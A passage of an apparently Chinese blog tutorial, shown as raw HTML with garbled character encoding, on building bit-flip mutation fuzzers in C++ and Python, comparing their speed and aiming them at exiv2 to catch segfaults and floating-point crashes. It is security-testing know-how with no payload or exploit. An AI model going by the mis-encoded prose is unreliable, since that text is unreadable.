result;&#125;</code></pre><p>è¿™äº›å‡½æ•°ä¸æˆ‘ä»¬çš„<code>Python</code>å®ç°ä¹Ÿå¾ˆç›¸ä¼¼ï¼Œ<code>vector_gen()</code>å‡ ä¹åªæ˜¯åˆ›å»ºäº†æˆ‘ä»¬çš„<code>magic value</code>çš„<code>vector</code>ï¼Œç„¶ååƒ<code>magic()</code>è¿™æ ·çš„åç»­å‡½æ•°ä½¿ç”¨è¯¥<code>vector</code>éšæœºé€‰æ‹©ä¸€ä¸ª<code>index</code>ï¼Œå¹¶ç”¨ç›¸åº”çš„å˜å¼‚æ•°æ®è¦†ç›–æœ‰æ•ˆ<code>jpeg</code>ä¸­çš„æ•°æ®ã€‚</p><p><code>func_pick()</code>éå¸¸ç®€å•ï¼Œåªæ˜¯è¿”å›ä¸€ä¸ª0æˆ–ä¸€ä¸ª1ï¼Œè¿™æ ·æˆ‘ä»¬çš„<code>fuzzer</code>å°±å¯ä»¥éšæœºåœ°é€‰æ‹©<code>bit_flip()</code>æˆ–<code>magic()</code>æ¥å˜å¼‚æˆ‘ä»¬çš„æœ‰æ•ˆçš„<code>jpeg</code>æ–‡ä»¶ï¼Œä¸ºäº†ä¿æŒä¸€è‡´æ€§ï¼Œè®©æˆ‘ä»¬çš„<code>fuzzer</code>æš‚æ—¶åªé€‰æ‹©<code>bit_flip()</code>ï¼Œåœ¨æˆ‘ä»¬çš„ç¨‹åºä¸­æ·»åŠ ä¸€è¡Œä¸´æ—¶çš„<code>function = 1</code>ï¼Œè¿™æ ·æˆ‘ä»¬å°±èƒ½ä¸æˆ‘ä»¬çš„<code>Python</code>æµ‹è¯•ç›¸åŒ¹é…äº†</p><p>ä¸‹é¢å°±æ˜¯æˆ‘ä»¬çš„<code>main()</code>å‡½æ•°ï¼Œå®ƒæ‰§è¡Œäº†æˆ‘ä»¬åˆ°ç›®å‰ä¸ºæ­¢çš„æ‰€æœ‰ä»£ç ï¼š</p><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>** argv)</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-keyword">if</span> (argc &lt; <span class="hljs-number">3</span>)    &#123;        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;Usage: ./cppfuzz &lt;valid jpeg&gt; &lt;number_of_fuzzing_iterations&gt;\n&quot;</span>;        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;Usage: ./cppfuzz Canon_40D.jpg 10000\n&quot;</span>;        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;    &#125;    <span class="hljs-comment">// start timer</span>    <span class="hljs-keyword">auto</span> start = <span class="hljs-built_in">std</span>::chrono::high_resolution_clock::now();    <span class="hljs-comment">// initialize our random seed</span>    srand((<span class="hljs-keyword">unsigned</span>)time(<span class="hljs-literal">NULL</span>));    <span class="hljs-comment">// generate our vector of magic numbers</span>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>&gt; magic_vector = vector_gen();    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> filename = argv[<span class="hljs-number">1</span>];    <span class="hljs-keyword">int</span> iterations = atoi(argv[<span class="hljs-number">2</span>]);    <span class="hljs-keyword">int</span> counter = <span class="hljs-number">0</span>;    <span class="hljs-keyword">while</span> (counter &lt; iterations)    &#123;        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> data = get_bytes(filename);        <span class="hljs-keyword">int</span> function = func_pick();        function = <span class="hljs-number">1</span>;        <span class="hljs-keyword">if</span> (function == <span class="hljs-number">0</span>)        &#123;            <span class="hljs-comment">// utilize the magic mutation method; create new jpg; send to exiv2</span>            <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> mutated = magic(data, magic_vector);            create_new(mutated);            exif(mutated,counter);            counter++;        &#125;        <span class="hljs-keyword">else</span>        &#123;            <span class="hljs-comment">// utilize the bit flip mutation; create new jpg; send to exiv2</span>            <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> mutated = bit_flip(data);            create_new(mutated);            exif(mutated,counter);            counter++;        &#125;    &#125;    <span class="hljs-comment">// stop timer and print execution time</span>    <span class="hljs-keyword">auto</span> <span class="hljs-built_in">stop</span> = <span class="hljs-built_in">std</span>::chrono::high_resolution_clock::now();    <span class="hljs-keyword">auto</span> duration = <span class="hljs-built_in">std</span>::chrono::duration_cast&lt;<span class="hljs-built_in">std</span>::chrono::milliseconds&gt;(<span class="hljs-built_in">stop</span> - start);    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;Execution Time: &quot;</span> &lt;&lt; duration.count() &lt;&lt; <span class="hljs-string">&quot;ms\n&quot;</span>;    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><p>æˆ‘ä»¬ä»å‘½ä»¤è¡Œå‚æ•°ä¸­å¾—åˆ°ä¸€ä¸ªæœ‰æ•ˆçš„<code>JPEG</code>è¿›è¡Œå˜å¼‚å’Œ<code>fuzzing</code>è¿­ä»£çš„æ¬¡æ•°ï¼Œæˆ‘ä»¬ç”¨<code>std::chrono</code>å‘½åç©ºé—´å»ºç«‹äº†ä¸€äº›è®¡æ—¶æœºåˆ¶ï¼Œä»¥è®¡æ—¶æˆ‘ä»¬çš„ç¨‹åºéœ€è¦è¿è¡Œå¤šé•¿æ—¶é—´ã€‚</p><p>æˆ‘ä»¬åœ¨è¿™é‡Œåªé€‰æ‹©<code>bit_flip()</code>ç±»å‹çš„å˜å¼‚æ˜¯ä¸€ç§ä½œå¼Šï¼Œä½†æ˜¯è¿™è¦æ˜¯æˆ‘ä»¬åœ¨<code>Python</code>æ‰€åšåœ°ä¸€æ ·ï¼Œæ‰€ä»¥æˆ‘ä»¬æƒ³è¦çš„ä¸€ç§å…¬å¹³åœ°æ¯”è¾ƒã€‚</p><p>è®©æˆ‘ä»¬ç»§ç»­ç„¶åè¿è¡Œå®ƒè¿›è¡Œ<code>100k</code>æ¬¡è¿­ä»£ï¼Œå¹¶ä¸”ä¸<code>Python fuzzer</code>åŸºå‡†æµ‹è¯•<code>256s</code>è¿›è¡Œæ¯”è¾ƒã€‚</p><p>å½“æˆ‘ä»¬è¿è¡Œ<code>C++ fuzzer</code>æ—¶ï¼Œæˆ‘ä»¬å¾—åˆ°äº†ä¸€ä¸ªç”¨æ¯«ç§’ä¸ºå•ä½çš„æ‰“å°æ—¶é—´ï¼š<code>Execution Time: 172638ms</code> ç›¸å½“äº <code>172s</code></p><p>å› æ­¤ï¼Œæˆ‘ä»¬ç”¨æˆ‘ä»¬æ–°çš„<code>C++ fuzzer</code>è½»æ¾åœ°æ‘§æ¯äº†æˆ‘ä»¬çš„<code>Python fuzzer</code>ï¼è®©æˆ‘ä»¬ç»§ç»­åœ¨è¿™é‡Œåšä¸€äº›ç®—æ•°è¿ç®—<code>172/256 = 67%</code>ï¼Œå› æ­¤æˆ‘ä»¬ç”¨<code>C++</code>å®ç°çš„é€Ÿåº¦å¤§çº¦æ˜¯å¿«äº†<code>33%</code></p><p>è®©æˆ‘ä»¬å¸¦ç€æˆ‘ä»¬ä¼˜åŒ–è¿‡çš„<code>Python</code>å’Œ<code>C++ fuzzer</code>ï¼Œå»å°è¯•ä¸€ä¸ªæ–°çš„ç›®æ ‡å§!</p><h2 id="Selecting-a-New-Victim"><a href="#Selecting-a-New-Victim" class="headerlink" title="Selecting a New Victim"></a>Selecting a New Victim</h2><p>çœ‹ä¸€ä¸‹<code>Kali Linux</code>ä¸Šé¢„è£…çš„ä¸œè¥¿ï¼Œå› ä¸ºè¿™æ˜¯æˆ‘ä»¬çš„æ“ä½œç¯å¢ƒï¼Œè®©æˆ‘ä»¬çœ‹ä¸€ä¸‹<code>exiv2</code>ï¼Œå®ƒæ˜¯åœ¨<code>/usr/bin/exiv2</code>ä¸­è¢«æ‰¾åˆ°ã€‚</p><pre><code class="hljs sql">root@kali:~<span class="hljs-comment"># exiv2 -h</span>Usage: exiv2 [ options ] [ action ] file ...Manipulate the Exif metadata of images.Actions:  ad | adjust   Adjust Exif timestamps by the given time. This action                requires at least one of the -a, -Y, -O or -D options.  pr | print    Print image metadata.  rm | <span class="hljs-keyword">delete</span>   <span class="hljs-keyword">Delete</span> image metadata <span class="hljs-keyword">from</span> the files.  <span class="hljs-keyword">in</span> | <span class="hljs-keyword">insert</span>   <span class="hljs-keyword">Insert</span> metadata <span class="hljs-keyword">from</span> <span class="hljs-keyword">corresponding</span> *.exv files.                <span class="hljs-keyword">Use</span> <span class="hljs-keyword">option</span> -S <span class="hljs-keyword">to</span> <span class="hljs-keyword">change</span> the suffix <span class="hljs-keyword">of</span> the <span class="hljs-keyword">input</span> files.  ex | <span class="hljs-keyword">extract</span>  <span class="hljs-keyword">Extract</span> metadata <span class="hljs-keyword">to</span> *.exv, *.xmp <span class="hljs-keyword">and</span> thumbnail image files.  mv | <span class="hljs-keyword">rename</span>   <span class="hljs-keyword">Rename</span> files <span class="hljs-keyword">and</span>/<span class="hljs-keyword">or</span> <span class="hljs-keyword">set</span> <span class="hljs-keyword">file</span> timestamps according <span class="hljs-keyword">to</span> the                Exif <span class="hljs-keyword">create</span> timestamp. The filename <span class="hljs-keyword">format</span> can be <span class="hljs-keyword">set</span> <span class="hljs-keyword">with</span>                -r <span class="hljs-keyword">format</span>, <span class="hljs-built_in">timestamp</span> options <span class="hljs-keyword">are</span> controlled <span class="hljs-keyword">with</span> -t <span class="hljs-keyword">and</span> -T.  mo | <span class="hljs-keyword">modify</span>   <span class="hljs-keyword">Apply</span> commands <span class="hljs-keyword">to</span> <span class="hljs-keyword">modify</span> (<span class="hljs-keyword">add</span>, <span class="hljs-keyword">set</span>, <span class="hljs-keyword">delete</span>) the Exif <span class="hljs-keyword">and</span>                IPTC metadata <span class="hljs-keyword">of</span> image files <span class="hljs-keyword">or</span> <span class="hljs-keyword">set</span> the JPEG comment.                Requires <span class="hljs-keyword">option</span> -c, -m <span class="hljs-keyword">or</span> -M.  fi | fixiso   Copy ISO setting <span class="hljs-keyword">from</span> the Nikon Makernote <span class="hljs-keyword">to</span> the regular                Exif tag.  fc | fixcom   <span class="hljs-keyword">Convert</span> the <span class="hljs-keyword">UNICODE</span> Exif <span class="hljs-keyword">user</span> <span class="hljs-keyword">comment</span> <span class="hljs-keyword">to</span> UCS<span class="hljs-number">-2.</span> Its <span class="hljs-keyword">current</span>                <span class="hljs-built_in">character</span> <span class="hljs-keyword">encoding</span> can be specified <span class="hljs-keyword">with</span> the -n option.Options:   -h      Display this <span class="hljs-keyword">help</span> <span class="hljs-keyword">and</span> exit.   -V      <span class="hljs-keyword">Show</span> the program <span class="hljs-keyword">version</span> <span class="hljs-keyword">and</span> exit.   -v      Be verbose during the program run.   -q      Silence <span class="hljs-keyword">warnings</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">error</span> messages during the program run (quiet).   -Q lvl  <span class="hljs-keyword">Set</span> <span class="hljs-keyword">log</span>-<span class="hljs-keyword">level</span> <span class="hljs-keyword">to</span> d(ebug), i(nfo), w(arning), e(rror) <span class="hljs-keyword">or</span> m(ute).   -b      <span class="hljs-keyword">Show</span> <span class="hljs-keyword">large</span> <span class="hljs-built_in">binary</span> values.   -u      <span class="hljs-keyword">Show</span> <span class="hljs-literal">unknown</span> tags.   -g <span class="hljs-keyword">key</span>  <span class="hljs-keyword">Only</span> <span class="hljs-keyword">output</span> info <span class="hljs-keyword">for</span> this <span class="hljs-keyword">key</span> (grep).   -K <span class="hljs-keyword">key</span>  <span class="hljs-keyword">Only</span> <span class="hljs-keyword">output</span> info <span class="hljs-keyword">for</span> this <span class="hljs-keyword">key</span> (exact <span class="hljs-keyword">match</span>).   -n enc  <span class="hljs-keyword">Charset</span> <span class="hljs-keyword">to</span> <span class="hljs-keyword">use</span> <span class="hljs-keyword">to</span> <span class="hljs-keyword">decode</span> <span class="hljs-keyword">UNICODE</span> Exif <span class="hljs-keyword">user</span> comments.   -k      <span class="hljs-keyword">Preserve</span> <span class="hljs-keyword">file</span> timestamps (<span class="hljs-keyword">keep</span>).   -t      Also <span class="hljs-keyword">set</span> the <span class="hljs-keyword">file</span> <span class="hljs-built_in">timestamp</span> <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;rename&#x27;</span> <span class="hljs-keyword">action</span> (overrides -k).   -T      <span class="hljs-keyword">Only</span> <span class="hljs-keyword">set</span> the <span class="hljs-keyword">file</span> <span class="hljs-built_in">timestamp</span> <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;rename&#x27;</span> <span class="hljs-keyword">action</span>, <span class="hljs-keyword">do</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">rename</span>           the <span class="hljs-keyword">file</span> (overrides -k).   -f      <span class="hljs-keyword">Do</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">prompt</span> <span class="hljs-keyword">before</span> overwriting existing files (<span class="hljs-keyword">force</span>).   -F      <span class="hljs-keyword">Do</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">prompt</span> <span class="hljs-keyword">before</span> renaming files (<span class="hljs-keyword">Force</span>).   -a <span class="hljs-built_in">time</span> <span class="hljs-built_in">Time</span> adjustment <span class="hljs-keyword">in</span> the <span class="hljs-keyword">format</span> [-]HH[:MM[:SS]]. This <span class="hljs-keyword">option</span>           <span class="hljs-keyword">is</span> <span class="hljs-keyword">only</span> used <span class="hljs-keyword">with</span> the <span class="hljs-string">&#x27;adjust&#x27;</span> action.   -Y yrs  <span class="hljs-keyword">Year</span> adjustment <span class="hljs-keyword">with</span> the <span class="hljs-string">&#x27;adjust&#x27;</span> action.   -O mon  <span class="hljs-keyword">Month</span> adjustment <span class="hljs-keyword">with</span> the <span class="hljs-string">&#x27;adjust&#x27;</span> action.   -D <span class="hljs-keyword">day</span>  <span class="hljs-keyword">Day</span> adjustment <span class="hljs-keyword">with</span> the <span class="hljs-string">&#x27;adjust&#x27;</span> action.   -p <span class="hljs-keyword">mode</span> Print <span class="hljs-keyword">mode</span> <span class="hljs-keyword">for</span> the <span class="hljs-string">&#x27;print&#x27;</span> action. Possible modes <span class="hljs-keyword">are</span>:             s : print a summary <span class="hljs-keyword">of</span> the Exif metadata (the <span class="hljs-keyword">default</span>)             a : print Exif, IPTC <span class="hljs-keyword">and</span> XMP metadata (shortcut <span class="hljs-keyword">for</span> -Pkyct)             t : interpreted (translated) Exif <span class="hljs-keyword">data</span> (-PEkyct)             v : plain Exif <span class="hljs-keyword">data</span> <span class="hljs-keyword">values</span> (-PExgnycv)             h : hexdump <span class="hljs-keyword">of</span> the Exif <span class="hljs-keyword">data</span> (-PExgnycsh)             i : IPTC <span class="hljs-keyword">data</span> <span class="hljs-keyword">values</span> (-PIkyct)             x : XMP properties (-PXkyct)             c : JPEG <span class="hljs-keyword">comment</span>             p : <span class="hljs-keyword">list</span> available previews             S : print structure <span class="hljs-keyword">of</span> image             X : <span class="hljs-keyword">extract</span> XMP <span class="hljs-keyword">from</span> image   -P flgs Print flags <span class="hljs-keyword">for</span> fine control <span class="hljs-keyword">of</span> tag lists (<span class="hljs-string">&#x27;print&#x27;</span> <span class="hljs-keyword">action</span>):             E : <span class="hljs-keyword">include</span> Exif tags <span class="hljs-keyword">in</span> the <span class="hljs-keyword">list</span>             I : IPTC datasets             X : XMP properties             x : print a <span class="hljs-keyword">column</span> <span class="hljs-keyword">with</span> the tag <span class="hljs-built_in">number</span>             g : <span class="hljs-keyword">group</span> <span class="hljs-keyword">name</span>             k : <span class="hljs-keyword">key</span>             l : tag label             n : tag <span class="hljs-keyword">name</span>             y : <span class="hljs-keyword">type</span>             c : <span class="hljs-built_in">number</span> <span class="hljs-keyword">of</span> components (<span class="hljs-keyword">count</span>)             s : <span class="hljs-keyword">size</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">bytes</span>             v : plain <span class="hljs-keyword">data</span> <span class="hljs-keyword">value</span>             t : interpreted (translated) <span class="hljs-keyword">data</span>             h : hexdump <span class="hljs-keyword">of</span> the <span class="hljs-keyword">data</span>   -d tgt  <span class="hljs-keyword">Delete</span> target(s) <span class="hljs-keyword">for</span> the <span class="hljs-string">&#x27;delete&#x27;</span> action. Possible targets <span class="hljs-keyword">are</span>:             a : <span class="hljs-keyword">all</span> supported metadata (the <span class="hljs-keyword">default</span>)             e : Exif <span class="hljs-keyword">section</span>             t : Exif thumbnail <span class="hljs-keyword">only</span>             i : IPTC <span class="hljs-keyword">data</span>             x : XMP packet             c : JPEG <span class="hljs-keyword">comment</span>   -i tgt  <span class="hljs-keyword">Insert</span> target(s) <span class="hljs-keyword">for</span> the <span class="hljs-string">&#x27;insert&#x27;</span> action. Possible targets <span class="hljs-keyword">are</span>           the same <span class="hljs-keyword">as</span> those <span class="hljs-keyword">for</span> the -d <span class="hljs-keyword">option</span>, plus a modifier:             X : <span class="hljs-keyword">Insert</span> metadata <span class="hljs-keyword">from</span> an XMP sidecar <span class="hljs-keyword">file</span> &lt;<span class="hljs-keyword">file</span>&gt;.xmp           <span class="hljs-keyword">Only</span> JPEG thumbnails can be inserted, they need <span class="hljs-keyword">to</span> be named           &lt;<span class="hljs-keyword">file</span>&gt;-thumb.jpg   -e tgt  <span class="hljs-keyword">Extract</span> target(s) <span class="hljs-keyword">for</span> the <span class="hljs-string">&#x27;extract&#x27;</span> action. Possible targets           <span class="hljs-keyword">are</span> the same <span class="hljs-keyword">as</span> those <span class="hljs-keyword">for</span> the -d <span class="hljs-keyword">option</span>, plus a target <span class="hljs-keyword">to</span> <span class="hljs-keyword">extract</span>           preview images <span class="hljs-keyword">and</span> a modifier <span class="hljs-keyword">to</span> generate an XMP sidecar <span class="hljs-keyword">file</span>:             p[&lt;n&gt;[,&lt;m&gt; ...]] : <span class="hljs-keyword">Extract</span> preview images.             X : <span class="hljs-keyword">Extract</span> metadata <span class="hljs-keyword">to</span> an XMP sidecar <span class="hljs-keyword">file</span> &lt;<span class="hljs-keyword">file</span>&gt;.xmp   -r fmt  Filename <span class="hljs-keyword">format</span> <span class="hljs-keyword">for</span> the <span class="hljs-string">&#x27;rename&#x27;</span> action. The <span class="hljs-keyword">format</span> <span class="hljs-keyword">string</span>           <span class="hljs-keyword">follows</span> strftime(<span class="hljs-number">3</span>). The <span class="hljs-keyword">following</span> keywords <span class="hljs-keyword">are</span> supported:             :basename:   - original filename <span class="hljs-keyword">without</span> extension             :dirname:    - <span class="hljs-keyword">name</span> <span class="hljs-keyword">of</span> the <span class="hljs-keyword">directory</span> holding the original <span class="hljs-keyword">file</span>             :parentname: - <span class="hljs-keyword">name</span> <span class="hljs-keyword">of</span> <span class="hljs-keyword">parent</span> <span class="hljs-keyword">directory</span>           <span class="hljs-keyword">Default</span> filename <span class="hljs-keyword">format</span> <span class="hljs-keyword">is</span> %Y%m%d_%H%M%S.   -c txt  JPEG <span class="hljs-keyword">comment</span> <span class="hljs-keyword">string</span> <span class="hljs-keyword">to</span> <span class="hljs-keyword">set</span> <span class="hljs-keyword">in</span> the image.   -m <span class="hljs-keyword">file</span> Command <span class="hljs-keyword">file</span> <span class="hljs-keyword">for</span> the <span class="hljs-keyword">modify</span> action. The <span class="hljs-keyword">format</span> <span class="hljs-keyword">for</span> commands <span class="hljs-keyword">is</span>           <span class="hljs-keyword">set</span>|<span class="hljs-keyword">add</span>|del &lt;<span class="hljs-keyword">key</span>&gt; [[&lt;<span class="hljs-keyword">type</span>&gt;] &lt;<span class="hljs-keyword">value</span>&gt;].   -M cmd  Command line <span class="hljs-keyword">for</span> the <span class="hljs-keyword">modify</span> action. The <span class="hljs-keyword">format</span> <span class="hljs-keyword">for</span> the           commands <span class="hljs-keyword">is</span> the same <span class="hljs-keyword">as</span> that <span class="hljs-keyword">of</span> the <span class="hljs-keyword">lines</span> <span class="hljs-keyword">of</span> a command file.   -l dir  Location (<span class="hljs-keyword">directory</span>) <span class="hljs-keyword">for</span> files <span class="hljs-keyword">to</span> be inserted <span class="hljs-keyword">from</span> <span class="hljs-keyword">or</span> extracted to.   -S .suf <span class="hljs-keyword">Use</span> suffix .suf <span class="hljs-keyword">for</span> <span class="hljs-keyword">source</span> files <span class="hljs-keyword">for</span> <span class="hljs-keyword">insert</span> command.</code></pre><p>çœ‹ä¸€ä¸‹å¸®åŠ©æŒ‡å—ï¼Œè®©æˆ‘ä»¬ç»§ç»­éšæœºåœ°å°è¯•ä¸€ä¸‹ç”¨äº<code>Print image metadata</code>çš„<code>pr</code>å’Œç”¨äº<code>Be verbose during the program run</code>çš„<code>-v</code>æŒ‡ä»¤ï¼Œä½ å¯ä»¥ä»è¿™ä¸ªå¸®åŠ©æŒ‡å—ä¸­çœ‹åˆ°è¿™é‡Œæœ‰å¤§é‡çš„æ”»å‡»é¢ä¾›æˆ‘ä»¬æ¢ç´¢ï¼Œä½†ç°åœ¨è®©æˆ‘ä»¬æŠŠäº‹æƒ…ç®€å•åŒ–ã€‚</p><p>ç°åœ¨åœ¨æˆ‘ä»¬<code>fuzzer</code>ä¸­çš„å‘½ä»¤è¡ŒæŒ‡ä»¤å­—ç¬¦å°†æ˜¯è¿™æ ·çš„ï¼š<code>exiv2 pr -v mutated.jpg</code></p><p>æˆ‘ä»¬ç»§ç»­æ›´æ–°æˆ‘ä»¬çš„<code>fuzzer</code>ï¼Œçœ‹çœ‹æˆ‘ä»¬æ˜¯å¦èƒ½åœ¨ä¸€ä¸ªæ›´éš¾çš„ç›®æ ‡ä¸Šæ‰¾åˆ°<code>bug</code>ï¼Œå€¼å¾—ä¸€æçš„æ˜¯ï¼Œè¿™ä¸ªç›®æ ‡æ˜¯å—æ”¯æŒçš„ï¼Œè€Œä¸åƒæˆ‘ä»¬ä¸Šä¸€ä¸ªç›®æ ‡ï¼Œå»æ‰¾ä¸€ä¸ªå¾®ä¸è¶³é“çš„äºŒè¿›åˆ¶çš„<code>bugs</code>ï¼ˆ<code>Github</code>ä¸Šä¸å†è¢«æ”¯æŒçš„7å¹´å·²ä¹…çš„é¡¹ç›®ï¼‰</p><p>è¿™ä¸ªç›®æ ‡å·²ç»è¢«æ›´é«˜çº§çš„<code>fuzzer</code>è¿›è¡Œæ¨¡ç³Šæµ‹è¯•è¿‡äº†ï¼Œä½ å¯ä»¥ç®€å•åœ°é€šè¿‡è°·æ­Œ<code>ASan exiv2</code>æœç´ ä¹‹ç±»åœ°ä¸œè¥¿ï¼Œå¹¶è·å¾—å¤§é‡çš„<code>fuzzer</code>åœ¨äºŒè¿›åˆ¶æ–‡ä»¶ä¸Šåˆ›å»ºçš„<code>segfaults</code>ï¼Œå¹¶è½¬å‘<code>ASan</code>è¾“å‡ºåˆ°<code>github</code>ä»“åº“ä½œä¸ºä¸€ä¸ª<code>bug</code>ï¼Œè¿™æ˜¯æˆ‘ä»¬ä¸Šä¸€ä¸ªç›®æ ‡çš„é‡è¦ä¸€æ­¥ã€‚</p><p><a href="https://github.com/Exiv2/exiv2">exiv2 on Github</a></p><p><a href="https://www.exiv2.org/">exiv2 Website</a></p><h2 id="Fuzzing-Our-New-Target"><a href="#Fuzzing-Our-New-Target" class="headerlink" title="Fuzzing Our New Target"></a>Fuzzing Our New Target</h2><p>è®©æˆ‘ä»¬ä»æˆ‘ä»¬æ–°çš„å’Œæ”¹è¿›çš„<code>Python fuzzer</code>å¼€å§‹ï¼Œç›‘æµ‹å®ƒåœ¨<code>50k</code>æ¬¡è¿­ä»£ä¸­çš„æ€§èƒ½ï¼Œè®©æˆ‘ä»¬æ·»åŠ ä¸€äº›ä»£ç ï¼Œé™¤äº†æˆ‘ä»¬çš„<code>Segmentation fault detection</code>å¤–ï¼Œè¿˜ç›‘æµ‹<code>Floating point exceptions</code>ï¼ˆç§°ä¹‹ä¸ºèµŒæ€ªï¼ï¼‰ï¼Œæˆ‘ä»¬çš„æ–°<code>exif()</code>å‡½æ•°å°†çœ‹èµ·æ¥åƒè¿™æ ·ï¼š</p><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">exif</span>(<span class="hljs-params">counter,data</span>):</span>    p = Popen([<span class="hljs-string">&quot;exiv2&quot;</span>, <span class="hljs-string">&quot;pr&quot;</span>, <span class="hljs-string">&quot;-v&quot;</span>, <span class="hljs-string">&quot;mutated.jpg&quot;</span>], stdout=PIPE, stderr=PIPE)    (out,err) = p.communicate()    <span class="hljs-keyword">if</span> p.returncode == <span class="hljs-number">-11</span>:        f = open(<span class="hljs-string">&quot;crashes2/crash.&#123;&#125;.jpg&quot;</span>.format(str(counter)), <span class="hljs-string">&quot;ab+&quot;</span>)        f.write(data)        print(<span class="hljs-string">&quot;Segfault!&quot;</span>)    <span class="hljs-keyword">elif</span> p.returncode == <span class="hljs-number">-8</span>:        f = open(<span class="hljs-string">&quot;crashes2/crash.&#123;&#125;.jpg&quot;</span>.format(str(counter)), <span class="hljs-string">&quot;ab+&quot;</span>)        f.write(data)        print(<span class="hljs-string">&quot;Floating Point!&quot;</span>)</code></pre><p>æˆ‘ä»¬æ¥çœ‹çœ‹<code>python3 -m cProfile -s cumtime subpro.py ~/jpegs/Canon_40D.jpg</code>çš„è¾“å‡ºï¼š</p><pre><code class="hljs yaml"><span class="hljs-number">75780446</span> <span class="hljs-string">function</span> <span class="hljs-string">calls</span> <span class="hljs-string">(75780309</span> <span class="hljs-string">primitive</span> <span class="hljs-string">calls)</span> <span class="hljs-string">in</span> <span class="hljs-number">213.595</span> <span class="hljs-string">seconds</span>   <span class="hljs-attr">Ordered by:</span> <span class="hljs-string">cumulative</span> <span class="hljs-string">time</span>   <span class="hljs-string">ncalls</span>  <span class="hljs-string">tottime</span>  <span class="hljs-string">percall</span>  <span class="hljs-string">cumtime</span>  <span class="hljs-string">percall</span> <span class="hljs-string">filename:lineno(function)</span>     <span class="hljs-number">15</span><span class="hljs-string">/1</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">0.000</span>  <span class="hljs-number">213.595</span>  <span class="hljs-number">213.595</span> &#123;<span class="hljs-string">built-in</span> <span class="hljs-string">method</span> <span class="hljs-string">builtins.exec</span>&#125;        <span class="hljs-number">1</span>    <span class="hljs-number">1.481</span>    <span class="hljs-number">1.481</span>  <span class="hljs-number">213.595</span>  <span class="hljs-number">213.595</span> <span class="hljs-string">subpro.py:3(&lt;module&gt;)</span>    <span class="hljs-number">50000</span>    <span class="hljs-number">0.818</span>    <span class="hljs-number">0.000</span>  <span class="hljs-number">187.205</span>    <span class="hljs-number">0.004</span> <span class="hljs-string">subpro.py:111(exif)</span>    <span class="hljs-number">50000</span>    <span class="hljs-number">0.543</span>    <span class="hljs-number">0.000</span>  <span class="hljs-number">143.499</span>    <span class="hljs-number">0.003</span> <span class="hljs-string">subprocess.py:920(communicate)</span>    <span class="hljs-number">50000</span>    <span class="hljs-number">6.773</span>    <span class="hljs-number">0.000</span>  <span class="hljs-number">142.873</span>    <span class="hljs-number">0.003</span> <span class="hljs-string">subprocess.py:1662(_communicate)</span>  <span class="hljs-number">1641352</span>    <span class="hljs-number">3.186</span>    <span class="hljs-number">0.000</span>  <span class="hljs-number">122.668</span>    <span class="hljs-number">0.000</span> <span class="hljs-string">selectors.py:402(select)</span>  <span class="hljs-number">1641352</span>  <span class="hljs-number">118.799</span>    <span class="hljs-number">0.000</span>  <span class="hljs-number">118.799</span>    <span class="hljs-number">0.000</span> &#123;<span class="hljs-string">method</span> <span class="hljs-string">&#x27;poll&#x27;</span> <span class="hljs-string">of</span> <span class="hljs-string">&#x27;select.poll&#x27;</span> <span class="hljs-string">objects</span>&#125;    <span class="hljs-number">50000</span>    <span class="hljs-number">1.220</span>    <span class="hljs-number">0.000</span>   <span class="hljs-number">42.888</span>    <span class="hljs-number">0.001</span> <span class="hljs-string">subprocess.py:681(__init__)</span>    <span class="hljs-number">50000</span>    <span class="hljs-number">4.400</span>    <span class="hljs-number">0.000</span>   <span class="hljs-number">39.364</span>    <span class="hljs-number">0.001</span> <span class="hljs-string">subprocess.py:1412(_execute_child)</span>  <span class="hljs-number">1691919</span>   <span class="hljs-number">25.759</span>    <span class="hljs-number">0.000</span>   <span class="hljs-number">25.759</span>    <span class="hljs-number">0.000</span> &#123;<span class="hljs-string">built-in</span> <span class="hljs-string">method</span> <span class="hljs-string">posix.read</span>&#125;    <span class="hljs-number">50000</span>    <span class="hljs-number">3.863</span>    <span class="hljs-number">0.000</span>   <span class="hljs-number">13.938</span>    <span class="hljs-number">0.000</span> <span class="hljs-string">subpro.py:14(bit_flip)</span>  <span class="hljs-number">7950000</span>    <span class="hljs-number">3.587</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">9.991</span>    <span class="hljs-number">0.000</span> <span class="hljs-string">random.py:256(choice)</span>    <span class="hljs-number">50000</span>    <span class="hljs-number">7.495</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">7.495</span>    <span class="hljs-number">0.000</span> &#123;<span class="hljs-string">built-in</span> <span class="hljs-string">method</span> <span class="hljs-string">_posixsubprocess.fork_exec</span>&#125;    <span class="hljs-number">50000</span>    <span class="hljs-number">0.148</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">7.081</span>    <span class="hljs-number">0.000</span> <span class="hljs-string">subpro.py:105(create_new)</span>  <span class="hljs-number">7950000</span>    <span class="hljs-number">3.884</span>    <span class="hljs-number">0.000</span>    <span class="hljs-number">5.764</span>    <span class="hljs-number">0.000</span> <span class="hljs-string">random.py:224(_randbelow)</span>   <span class="hljs-number">200000</span>    <span 